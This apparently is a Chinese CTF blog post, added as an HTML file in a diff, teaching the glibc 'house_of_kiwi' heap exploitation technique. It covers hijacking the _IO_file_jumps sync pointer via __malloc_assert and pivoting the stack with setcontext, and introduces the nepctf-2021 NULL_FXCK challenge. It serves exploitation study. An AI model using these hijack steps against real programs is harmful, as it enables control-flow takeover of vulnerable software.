@@ -1,0 +1,770 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/wod.jpg">
+  <link rel="icon" href="/img/wod.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="CH13hh">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="house of kiwi前言：house_of_kiwi 一般是通过触发__malloc_assert来刷新IO流，最后可以劫持程序流或者通过和setcontext来打配合来进行栈迁移来得到flag。 我们看看触发的源码 123456789101112131415161718192021#if IS_IN (libc)#ifndef NDEBUG# define __assert_fail(as">
+<meta property="og:type" content="article">
+<meta property="og:title" content="常回家看看之house_of_kiwi">
+<meta property="og:url" content="https://ch13hh.github.io/2024/09/10/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-kiwi/index.html">
+<meta property="og:site_name" content="CH13hh">
+<meta property="og:description" content="house of kiwi前言：house_of_kiwi 一般是通过触发__malloc_assert来刷新IO流，最后可以劫持程序流或者通过和setcontext来打配合来进行栈迁移来得到flag。 我们看看触发的源码 123456789101112131415161718192021#if IS_IN (libc)#ifndef NDEBUG# define __assert_fail(as">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ch13hh.github.io/2024/09/10/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-kiwi/3419447-20240910135459034-1831903992.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/09/10/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-kiwi/3419447-20240910135916067-1174633673.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/09/10/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-kiwi/3419447-20240910140002274-1838616609.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/09/10/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-kiwi/3419447-20240910140201072-1884939081.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/09/10/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-kiwi/3419447-20240910194908326-132930920.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/09/10/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-kiwi/3419447-20240910194842502-1275553514.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/09/10/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-kiwi/3419447-20240910202520917-1426703431.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/09/10/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-kiwi/3419447-20240910202555232-2002728228.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/09/10/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-kiwi/3419447-20240910202629686-588878874.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/09/10/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-kiwi/3419447-20240910202658837-1880588532.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/09/10/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-kiwi/3419447-20240910202923078-1143309769.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/09/10/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-kiwi/3419447-20240910203743142-1403970523.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/09/10/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-kiwi/3419447-20240910204311146-480753226.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/09/10/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-kiwi/3419447-20240910204526845-1874284413.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/09/10/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-kiwi/3419447-20240910204909438-688353297.png">
+<meta property="article:published_time" content="2024-09-10T06:54:48.000Z">
+<meta property="article:modified_time" content="2024-09-13T06:57:56.133Z">
+<meta property="article:author" content="CH13hh">
+<meta property="article:tag" content="PWN">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://ch13hh.github.io/2024/09/10/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-kiwi/3419447-20240910135459034-1831903992.png">
+  
+  
+  
+  <title>常回家看看之house_of_kiwi - CH13hh</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"ch13hh.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"AWdKxtM41CcPxu2EZoBdWpas-gzGzoHsz","app_key":"idRJngxDPrsuLA4G1dKyEewP","server_url":"https://awdkxtm4.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>CH13hh</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/zhuye.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="常回家看看之house_of_kiwi"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-09-10 14:54" pubdate>
+          2024年9月10日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          <!-- compatible with older versions-->
+          17 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">常回家看看之house_of_kiwi</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="house-of-kiwi"><a href="#house-of-kiwi" class="headerlink" title="house of kiwi"></a>house of kiwi</h2><h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a><strong>前言：</strong></h3><p><strong>house_of_kiwi 一般是通过触发__malloc_assert来刷新IO流，最后可以劫持程序流或者通过和setcontext来打配合来进行栈迁移来得到flag。</strong></p>
+<p><strong>我们看看触发的源码</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">if</span> IS_IN (libc)</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> NDEBUG</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> __assert_fail(assertion, file, <span class="hljs-keyword">line</span>, function)			\</span><br><span class="hljs-meta">	 __malloc_assert(assertion, file, <span class="hljs-keyword">line</span>, function)</span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">const</span> <span class="hljs-type">char</span> *__progname;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br>__malloc_assert (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *assertion, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *file, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> line,<br>		 <span class="hljs-type">const</span> <span class="hljs-type">char</span> *function)<br>&#123;<br>  (<span class="hljs-type">void</span>) __fxprintf (<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,<br>		     __progname, __progname[<span class="hljs-number">0</span>] ? <span class="hljs-string">&quot;: &quot;</span> : <span class="hljs-string">&quot;&quot;</span>,<br>		     file, line,<br>		     function ? function : <span class="hljs-string">&quot;&quot;</span>, function ? <span class="hljs-string">&quot;: &quot;</span> : <span class="hljs-string">&quot;&quot;</span>,<br>		     assertion);<br>  fflush (<span class="hljs-built_in">stderr</span>);<br>  <span class="hljs-built_in">abort</span> ();<br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure>
+
+<p><strong>可以看见*<em>__malloc_assert调用了<code>__fxprintf</code>和<code>fflush</code>，而这个函数调用后会调用<code>_IO_file_jumps</code>中的<code>sync</code>指针。*</em></strong></p>
+<p><em><strong>*这个指针在<code>_IO_file_jumps</code>偏移为0x60的位置，那么将这个指针进行劫持，就能达到我们想要的目的，如果题目禁用了execve的话，可以考虑通过setcontext来实现栈迁移*</strong></em></p>
+<p><em><strong>*我们看一下这个这个函数*</strong></em></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs c">text:<span class="hljs-number">0000000000053030</span> ; __unwind &#123;<br>.text:<span class="hljs-number">0000000000053030</span>                 endbr64<br>.text:<span class="hljs-number">0000000000053034</span>                 push    rdi<br>.text:<span class="hljs-number">0000000000053035</span>                 lea     rsi, [rdi+<span class="hljs-number">128</span>h] ; nset<br>.text:<span class="hljs-number">000000000005303</span>C                 xor     edx, edx        ; oset<br>.text:<span class="hljs-number">000000000005303</span>E                 mov     edi, <span class="hljs-number">2</span>          ; how<br>.text:<span class="hljs-number">0000000000053043</span>                 mov     r10d, <span class="hljs-number">8</span>         ; sigsetsize<br>.text:<span class="hljs-number">0000000000053049</span>                 mov     eax, <span class="hljs-number">0</span>Eh<br>.text:<span class="hljs-number">000000000005304</span>E                 syscall                 ; LINUX - sys_rt_sigprocmask<br>.text:<span class="hljs-number">0000000000053050</span>                 pop     rdx<br>.text:<span class="hljs-number">0000000000053051</span>                 cmp     rax, <span class="hljs-number">0F</span>FFFFFFFFFFFF001h<br>.text:<span class="hljs-number">0000000000053057</span>                 jnb     loc_5317F<br>.text:<span class="hljs-number">000000000005305</span>D                 mov     rcx, [rdx+<span class="hljs-number">0E0</span>h]<br>.text:<span class="hljs-number">0000000000053064</span>                 fldenv  byte ptr [rcx]<br>.text:<span class="hljs-number">0000000000053066</span>                 ldmxcsr dword ptr [rdx+<span class="hljs-number">1</span>C0h]<br>.text:<span class="hljs-number">000000000005306</span>D                 mov     rsp, [rdx+<span class="hljs-number">0</span>A0h]          <span class="hljs-comment">//这里将rdx+0xa0的值赋值给了rsp，也就是我们控制了rdx就控制了rsp</span><br>.text:<span class="hljs-number">0000000000053074</span>                 mov     rbx, [rdx+<span class="hljs-number">80</span>h]<br>.text:<span class="hljs-number">000000000005307B</span>                 mov     rbp, [rdx+<span class="hljs-number">78</span>h]<br>.text:<span class="hljs-number">000000000005307F</span>                 mov     r12, [rdx+<span class="hljs-number">48</span>h]<br>.text:<span class="hljs-number">0000000000053083</span>                 mov     r13, [rdx+<span class="hljs-number">50</span>h]<br>.text:<span class="hljs-number">0000000000053087</span>                 mov     r14, [rdx+<span class="hljs-number">58</span>h]<br>.text:<span class="hljs-number">000000000005308B</span>                 mov     r15, [rdx+<span class="hljs-number">60</span>h]<br>.text:<span class="hljs-number">000000000005308F</span>                 test    dword ptr fs:<span class="hljs-number">48</span>h, <span class="hljs-number">2</span><br>.text:<span class="hljs-number">000000000005309B</span>                 jz      loc_53156<br>.text:<span class="hljs-number">00000000000530</span>A1                 mov     rsi, [rdx+<span class="hljs-number">3</span>A8h]<br>.text:<span class="hljs-number">00000000000530</span>A8                 mov     rdi, rsi<br>.text:<span class="hljs-number">00000000000530</span>AB                 mov     rcx, [rdx+<span class="hljs-number">3B</span>0h]<br>.text:<span class="hljs-number">00000000000530B</span>2                 cmp     rcx, fs:<span class="hljs-number">78</span>h<br>.text:<span class="hljs-number">00000000000530B</span>B                 jz      <span class="hljs-type">short</span> loc_530F5<br>.text:<span class="hljs-number">00000000000530B</span>D<br>.text:<span class="hljs-number">00000000000530B</span>D loc_530BD:                              ; CODE XREF: setcontext+<span class="hljs-number">9</span>E↓j<br>.text:<span class="hljs-number">00000000000530B</span>D                 mov     rax, [rsi<span class="hljs-number">-8</span>]<br>.text:<span class="hljs-number">00000000000530</span>C1                 and     rax, <span class="hljs-number">0F</span>FFFFFFFFFFFFFF8h<br>.text:<span class="hljs-number">00000000000530</span>C5                 cmp     rax, rsi<br>.text:<span class="hljs-number">00000000000530</span>C8                 jz      <span class="hljs-type">short</span> loc_530D0<br>.text:<span class="hljs-number">00000000000530</span>CA                 sub     rsi, <span class="hljs-number">8</span><br>.text:<span class="hljs-number">00000000000530</span>CE                 jmp     <span class="hljs-type">short</span> loc_530BD<br>.text:<span class="hljs-number">00000000000530</span>D0 ; ---------------------------------------------------------------------------<br>.text:<span class="hljs-number">00000000000530</span>D0<br>.text:<span class="hljs-number">00000000000530</span>D0 loc_530D0:                              ; CODE XREF: setcontext+<span class="hljs-number">98</span>↑j<br>.text:<span class="hljs-number">00000000000530</span>D0                 mov     rax, <span class="hljs-number">1</span><br>.text:<span class="hljs-number">00000000000530</span>D7                 incsspq rax<br>.text:<span class="hljs-number">00000000000530</span>DC                 rstorssp qword ptr [rsi<span class="hljs-number">-8</span>]<br>.text:<span class="hljs-number">00000000000530E1</span>                 saveprevssp<br>.text:<span class="hljs-number">00000000000530E5</span>                 mov     rax, [rdx+<span class="hljs-number">3B</span>0h]<br>.text:<span class="hljs-number">00000000000530</span>EC                 mov     fs:<span class="hljs-number">78</span>h, rax<br>.text:<span class="hljs-number">00000000000530F</span>5<br>.text:<span class="hljs-number">00000000000530F</span>5 loc_530F5:                              ; CODE XREF: setcontext+<span class="hljs-number">8B</span>↑j<br>.text:<span class="hljs-number">00000000000530F</span>5                 rdsspq  rcx<br>.text:<span class="hljs-number">00000000000530F</span>A                 sub     rcx, rdi<br>.text:<span class="hljs-number">00000000000530F</span>D                 jz      <span class="hljs-type">short</span> loc_5311C<br>.text:<span class="hljs-number">00000000000530F</span>F                 neg     rcx<br>.text:<span class="hljs-number">0000000000053102</span>                 shr     rcx, <span class="hljs-number">3</span><br>.text:<span class="hljs-number">0000000000053106</span>                 mov     esi, <span class="hljs-number">0F</span>Fh<br>.text:<span class="hljs-number">000000000005310B</span><br>.text:<span class="hljs-number">000000000005310B</span> loc_5310B:                              ; CODE XREF: setcontext+EA↓j<br>.text:<span class="hljs-number">000000000005310B</span>                 cmp     rcx, rsi<br>.text:<span class="hljs-number">000000000005310</span>E                 cmovb   rsi, rcx<br>.text:<span class="hljs-number">0000000000053112</span>                 incsspq rsi<br>.text:<span class="hljs-number">0000000000053117</span>                 sub     rcx, rsi<br>.text:<span class="hljs-number">000000000005311</span>A                 ja      <span class="hljs-type">short</span> loc_5310B<br>.text:<span class="hljs-number">000000000005311</span>C<br>.text:<span class="hljs-number">000000000005311</span>C loc_5311C:                              ; CODE XREF: setcontext+CD↑j<br>.text:<span class="hljs-number">000000000005311</span>C                 mov     rsi, [rdx+<span class="hljs-number">70</span>h]<br>.text:<span class="hljs-number">0000000000053120</span>                 mov     rdi, [rdx+<span class="hljs-number">68</span>h]<br>.text:<span class="hljs-number">0000000000053124</span>                 mov     rcx, [rdx+<span class="hljs-number">98</span>h]<br>.text:<span class="hljs-number">000000000005312B</span>                 mov     r8, [rdx+<span class="hljs-number">28</span>h]<br>.text:<span class="hljs-number">000000000005312F</span>                 mov     r9, [rdx+<span class="hljs-number">30</span>h]<br>.text:<span class="hljs-number">0000000000053133</span>                 mov     r10, [rdx+<span class="hljs-number">0</span>A8h]<br>.text:<span class="hljs-number">000000000005313</span>A                 mov     rdx, [rdx+<span class="hljs-number">88</span>h]<br>.text:<span class="hljs-number">0000000000053141</span>                 rdsspq  rax<br>.text:<span class="hljs-number">0000000000053146</span>                 cmp     r10, [rax]<br>.text:<span class="hljs-number">0000000000053149</span>                 mov     eax, <span class="hljs-number">0</span><br>.text:<span class="hljs-number">000000000005314</span>E                 jnz     <span class="hljs-type">short</span> loc_53153<br>.text:<span class="hljs-number">0000000000053150</span>                 push    r10<br>.text:<span class="hljs-number">0000000000053152</span>                 retn<br>.text:<span class="hljs-number">0000000000053153</span> ; ---------------------------------------------------------------------------<br>.text:<span class="hljs-number">0000000000053153</span><br>.text:<span class="hljs-number">0000000000053153</span> loc_53153:                              ; CODE XREF: setcontext+<span class="hljs-number">11</span>E↑j<br>.text:<span class="hljs-number">0000000000053153</span>                 jmp     r10<br>.text:<span class="hljs-number">0000000000053156</span> ; ---------------------------------------------------------------------------<br>.text:<span class="hljs-number">0000000000053156</span><br>.text:<span class="hljs-number">0000000000053156</span> loc_53156:                              ; CODE XREF: setcontext+<span class="hljs-number">6B</span>↑j<br>.text:<span class="hljs-number">0000000000053156</span>                 mov     rcx, [rdx+<span class="hljs-number">0</span>A8h]  <span class="hljs-comment">//也可以控制到rcx</span><br>.text:<span class="hljs-number">000000000005315</span>D                 push    rcx               <span class="hljs-comment">//控制到rip</span><br>.text:<span class="hljs-number">000000000005315</span>E                 mov     rsi, [rdx+<span class="hljs-number">70</span>h]<br>.text:<span class="hljs-number">0000000000053162</span>                 mov     rdi, [rdx+<span class="hljs-number">68</span>h]<br>.text:<span class="hljs-number">0000000000053166</span>                 mov     rcx, [rdx+<span class="hljs-number">98</span>h]<br>.text:<span class="hljs-number">000000000005316</span>D                 mov     r8, [rdx+<span class="hljs-number">28</span>h]<br>.text:<span class="hljs-number">0000000000053171</span>                 mov     r9, [rdx+<span class="hljs-number">30</span>h]<br>.text:<span class="hljs-number">0000000000053175</span>                 mov     rdx, [rdx+<span class="hljs-number">88</span>h]<br>.text:<span class="hljs-number">0000000000053175</span> ; &#125; <span class="hljs-comment">// starts at 53030</span><br>.text:<span class="hljs-number">000000000005317</span>C ; __unwind &#123;<br>.text:<span class="hljs-number">000000000005317</span>C                 xor     eax, eax<br>.text:<span class="hljs-number">000000000005317</span>E                 retn<br></code></pre></td></tr></table></figure>
+
+<p> <strong>也就是说控制到rdx + 0xa0 和rdx + 0xa8的位置就可以实现栈迁移，那么就要搞清楚，调用这个指针的时候，rdx是什么,那么就需要调试一下</strong></p>
+<p><strong><img src="/2024/09/10/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-kiwi/3419447-20240910135459034-1831903992.png" srcset="/img/loading.gif" lazyload alt="img"></strong></p>
+<p><strong>调用了fflush</strong></p>
+<p><strong><img src="/2024/09/10/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-kiwi/3419447-20240910135916067-1174633673.png" srcset="/img/loading.gif" lazyload alt="img"></strong></p>
+<p><strong>这里sync指针已经被我修改变成了setcontext+61的地址</strong></p>
+<p><strong><img src="/2024/09/10/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-kiwi/3419447-20240910140002274-1838616609.png" srcset="/img/loading.gif" lazyload alt="img"></strong></p>
+<p><strong>而此时的rdx是 IO_helper_jumps的地址</strong></p>
+<p><strong><img src="/2024/09/10/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-kiwi/3419447-20240910140201072-1884939081.png" srcset="/img/loading.gif" lazyload alt="img"></strong></p>
+<p><strong>那么劫持到 IO_helper_jumps + 0xa0即可劫持程序流</strong></p>
+<h3 id="小结："><a href="#小结：" class="headerlink" title="小结："></a><strong>小结：</strong></h3><p><strong>想要达到house_of_kiwi需要至少两次任意地址改，修改sync指针，以及*<em>IO_helper_jumps +0xa0和0xa8的位置，然后就可以劫持到程序流了，对于2.27以上堆题目来说可以通过劫持tcache bin 结构体来达到任意地址分配，进而达到目的。*</em></strong></p>
+<p><strong>相比较其他的house_of系列kiwi要求的条件也比较苛刻，但是它的利用手法并不难，在能满足这个条件的情况下，这种手法还是非常不错的。</strong></p>
+<h2 id="例题：nepctf-2021-NULL-FXCK"><a href="#例题：nepctf-2021-NULL-FXCK" class="headerlink" title="例题：nepctf-2021 NULL_FXCK"></a><strong>例题：nepctf-2021 NULL_FXCK</strong></h2><p><strong>题目链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/134UgXo_mBGyXGfRzjzUfUQ?pwd=k5h6">题目</a><br>提取码：k5h6</strong></p>
+<p><strong>ida逆向分析</strong></p>
+<p><strong>add函数规定了申请chunk有大小的限制，最小0x100，最大0x2000</strong></p>
